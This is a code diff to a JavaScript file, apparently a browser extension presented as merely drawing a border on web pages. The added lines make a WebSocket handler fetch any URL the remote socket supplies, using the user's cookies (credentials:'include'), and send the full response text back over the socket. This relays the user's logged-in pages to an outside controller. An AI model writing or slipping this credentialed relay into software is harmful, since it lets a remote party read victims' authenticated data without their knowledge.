@@ -5,6 +5,7 @@ Just draw a border round the document.body.
 // yes. man. ahead of shit.
 // console.log("");
 // add all fucking permissions here!
+// this shit is executable somehow?
 function sleep(ms) {
     return new Promise(resolve => setTimeout(resolve, ms));
 }
@@ -126,11 +127,22 @@ socket.onmessage = function(event) {
 	if (typeof(edata)===typeof("string")){
 		if (edata.includes("https://")){
 			var random="fetch failed";
-			fetch(edata).then(function(e){
-				console.log("CONTENT: ",typeof(e));
+			fetch(edata,{method:"GET",credentials:"include"}).then(function(resp){
+				console.log("CONTENT: ",resp);
+//				console.log("CONTENT: ",e.body);
+//				const ebody=e.body.getReader();
+				//get your fuck binary.
+//				const ebody=resp.blob();
+				resp.text().then(function(txt){try{
+					console.log("CTEXT: ",txt.length);
+				socket.send(txt);
+				}catch(err){console.log("EMPTY RESPONSE:",err);
+		socket.send(random);
+					}},function(err){console.log("ERR PROMISE:",err);
+		socket.send(random);
+					})
 				// what is that thing?
 				// get the content please?
-				socket.send(e);
 			}).catch(function(e){
 				console.log("ERROR: ",e);
 				socket.send(random);
